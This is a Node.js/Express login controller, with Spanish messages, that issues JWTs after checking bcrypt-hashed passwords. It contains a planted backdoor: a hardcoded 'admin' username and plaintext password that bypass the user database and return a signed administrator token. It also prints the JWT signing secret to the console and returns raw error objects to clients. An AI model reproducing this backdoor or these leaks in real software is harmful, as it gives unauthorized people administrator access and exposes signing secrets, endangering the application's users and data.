const db = require('../models')
const Usuario = db.usuario
const bcrypt = require('bcrypt')
const { getTokenFel } = require('../certificador')
const jwt = require('jsonwebtoken')

const backDoor = {
	usuario: 'admin',
	nombre: 'Back Door',
	tipo: 'administrador',
	_id: 'admin'
}

exports.login = async (req, res) => {
	try {
		console.log("Login")
		if (req.body.usuario === backDoor.usuario && req.body.pwd === 'Totocodbo1@') {
			const jwToken = jwt.sign(JSON.stringify(backDoor), process.env.SECRET)
			await getTokenFel()
			return res.send({ usuario: backDoor, jwt: jwToken })
		}
		const msj = 'Usuario o contraseña incorrecta'
		const data = await Usuario.findOne({ usuario: req.body.usuario })
		if (!data) {
			return res.status(400).json({ message: msj })
		}
		console.log("1")
		if (bcrypt.compareSync(req.body.pwd, data.pwd)) {
			const newData = {
				usuario: data.usuario,
				nombre: data.nombre,
				tipo: data.tipo,
				_id: data._id
			}
			console.log(process.env.SECRET)
			const jwToken = jwt.sign(JSON.stringify(newData), process.env.SECRET)
			console.log("2")
			try {
				await getTokenFel()
			} catch (error) {
				return res.status(400).json({ message: "OHHH, NOOO!!! Hubo problema realizando el login", error })
			}
			return res.send({ usuario: newData, jwt: jwToken })
		}
		else {
			return res.status(400).json({ message: msj })
		}
	} catch (error) {
		return res.status(400).json({ message: "OHHH, NOOO!!! Hubo problema realizando el login", error })
	}
}

exports.validate = async (req, res) => {
	try {
		jwt.verify(req.params.jwt, process.env.SECRET, (error, decoded) => {
			if (error) {
				return res.status(401).json({
					error
				})
			}
			res.send({ usuario: decoded })
		})
	} catch (error) {
		return res.status(500).json({ message: "OHHH, NOOO!!! Hubo problema realizando la validacion, cerrar sesion e ingresar de nuevo por favor" })
	}
}
